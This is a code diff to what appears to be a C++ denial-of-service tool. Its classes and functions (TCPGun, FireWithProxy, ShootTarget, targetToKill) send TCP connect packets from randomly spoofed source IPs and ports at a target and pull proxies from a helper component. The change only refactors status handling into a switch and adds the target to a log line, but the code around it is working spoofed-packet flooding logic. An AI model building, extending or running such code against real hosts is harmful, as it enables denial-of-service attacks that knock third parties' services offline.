@@ -43,12 +43,14 @@ bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) 
 void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	Informator informer;
-	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
+	while(!m_currentTask.ShouldStop() &&
+		!informer.LoadNewData())
 	{
 	}
 
 	std::optional<std::vector<Proxy>> proxies;
-	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
+	while(!m_currentTask.ShouldStop() &&
+		!(proxies = informer.GetProxies()).has_value())
 	{
 	}
 
@@ -69,17 +71,25 @@ bool TCPGun::ShootTarget(const CURI &targetToShoot, std::size_t &hitsCount)
 	{
 		CURI fakeSource{GetRandomIP()};
 		fakeSource.SetPort(GetRandomPort());
-		TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);
 
-		if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck)
+		const TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);
+		switch (sendStatus)
 		{
-			SPDLOG_WARN("Connectivity issues");
-		}
-		if(sendStatus == TCPWrapper::TCPStatus::GotError)
-		{
-			hitsCount += count;
-			SPDLOG_WARN("Something went wrong durring sending packet");
-			return true;
+			case TCPWrapper::TCPStatus::GotError:
+			{
+				hitsCount += count;
+				SPDLOG_WARN("Something went wrong durring sending packet to: {}", targetToShoot);
+				return true;
+			}
+			case TCPWrapper::TCPStatus::NeedConnectivityCheck:
+			{
+				SPDLOG_WARN("Connectivity issues");
+				break;
+			}
+
+			case TCPWrapper::TCPStatus::Success:
+			default:
+			break;
 		}
 	}
 	SPDLOG_INFO("Already sent: {} packets to {}, rechecking target...", count, 
